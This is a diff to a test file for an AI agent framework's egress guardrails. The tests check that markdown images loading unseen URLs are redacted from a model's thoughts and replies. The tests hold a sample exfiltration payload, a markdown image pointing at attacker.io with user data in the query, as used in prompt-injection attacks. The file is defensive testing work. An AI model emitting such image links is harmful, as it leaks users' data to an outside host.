@@ -6,8 +6,8 @@
 import '../fixtures/test-host.ts';
 import { z } from 'zod';
 import { standardEgressEnforce } from '../../src/guardrails/egress.ts';
+import { lexiconDefault } from '../../src/guardrails/lexicon.ts';
 import { EGRESS_RULES } from '../../src/guardrails/rules.ts';
-import { OMIT_IMAGE } from '../../src/guardrails/thought-guard.ts';
 import {
   registerProfile,
   registerTool,
@@ -20,6 +20,8 @@ import type { ModelProvider, TurnEvent, TurnRequest } from '../../src/kernel/typ
 import { eventsOf } from '../fixtures/events.ts';
 import { MockLiveWebSocket } from '../fixtures/live-socket.ts';
 import { geminiModels, HOST_BINDINGS } from '../fixtures/models.ts';
+
+const OMIT_IMAGE = lexiconDefault('thought.omitted_image');
 
 const PHOTO = 'https://news.site/photo.jpg';
 
@@ -55,6 +57,19 @@ registerProfile(
 );
 
 /** Step one looks up a photo, saying `first`; step two replies `reply`. */
+/** Whether the reply was stopped for an image, and whether a thought had one omitted. */
+function imageVerdicts(events: TurnEvent[]): { imageBlocked: boolean; thoughtOmitted: boolean } {
+  const image = eventsOf(events, 'guardrail').filter((e) =>
+    e.guardrail.hits?.some((hit) => hit.rule === EGRESS_RULES.image),
+  );
+  return {
+    imageBlocked: image.some((e) => e.guardrail.stage !== 'thought'),
+    thoughtOmitted: image.some(
+      (e) => e.guardrail.stage === 'thought' && e.guardrail.action === 'redact',
+    ),
+  };
+}
+
 function lookupThen(reply: string, first?: string): ModelProvider {
   let call = 0;
   return {
@@ -82,17 +97,14 @@ async function run(provider: ModelProvider, request: Partial<TurnRequest> = {}) 
   )) {
     events.push(event);
   }
-  const imageBlocked = eventsOf(events, 'guardrail').some((e) =>
-    e.guardrail.hits?.some((hit) => hit.rule === EGRESS_RULES.image),
-  );
   return {
+    ...imageVerdicts(events),
     text: eventsOf(events, 'text')
       .map((e) => e.text ?? '')
       .join(''),
     thought: eventsOf(events, 'thought')
       .map((e) => e.text ?? '')
       .join(''),
-    imageBlocked,
   };
 }
 
@@ -129,10 +141,16 @@ Deno.test('image exfil: a thought loading an unseen image loses it, and the turn
       yield { type: 'text', text: 'Done.' };
     },
   };
-  const { text, thought, imageBlocked } = await run(provider);
+  const { text, thought, imageBlocked, thoughtOmitted } = await run(provider);
   assertEquals(
-    [imageBlocked, text, thought.includes('attacker.io'), thought.includes(OMIT_IMAGE)],
-    [false, 'Done.', false, true],
+    [
+      imageBlocked,
+      thoughtOmitted,
+      text,
+      thought.includes('attacker.io'),
+      thought.includes(OMIT_IMAGE),
+    ],
+    [false, true, 'Done.', false, true],
   );
   assertEquals(thought.includes('![photo](https://brand.site/logo.png)'), true);
 });
@@ -140,7 +158,7 @@ Deno.test('image exfil: a thought loading an unseen image loses it, and the turn
 async function liveReply(
   reply: string,
   thought?: string,
-): Promise<{ text: string; thought: string; imageBlocked: boolean }> {
+): Promise<{ text: string; thought: string; imageBlocked: boolean; thoughtOmitted: boolean }> {
   const profile = defineProfile({
     type: 'live',
     id: 'image_exfil_live',
@@ -193,9 +211,7 @@ async function liveReply(
     thought: eventsOf(events, 'thought')
       .map((e) => e.text ?? '')
       .join(''),
-    imageBlocked: eventsOf(events, 'guardrail').some((e) =>
-      e.guardrail.hits?.some((hit) => hit.rule === EGRESS_RULES.image),
-    ),
+    ...imageVerdicts(events),
   };
 }
 
@@ -209,8 +225,13 @@ Deno.test('image exfil: a Live reply and its transcript render an image a tool r
 Deno.test('image exfil: a Live thought loading an unseen image loses it, and the reply goes on', async () => {
   const shown = await liveReply('All set.', 'Try ![p](https://attacker.io/p?d=alice) first. ');
   assertEquals(
-    [shown.imageBlocked, shown.text.includes('All set.'), shown.thought.includes('attacker.io')],
-    [false, true, false],
+    [
+      shown.imageBlocked,
+      shown.thoughtOmitted,
+      shown.text.includes('All set.'),
+      shown.thought.includes('attacker.io'),
+    ],
+    [false, true, true, false],
   );
   assertEquals(shown.thought.includes(OMIT_IMAGE), true);
 });
